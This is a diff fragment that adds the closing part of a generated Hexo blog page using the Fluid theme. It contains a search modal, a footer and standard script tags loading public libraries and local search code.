+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
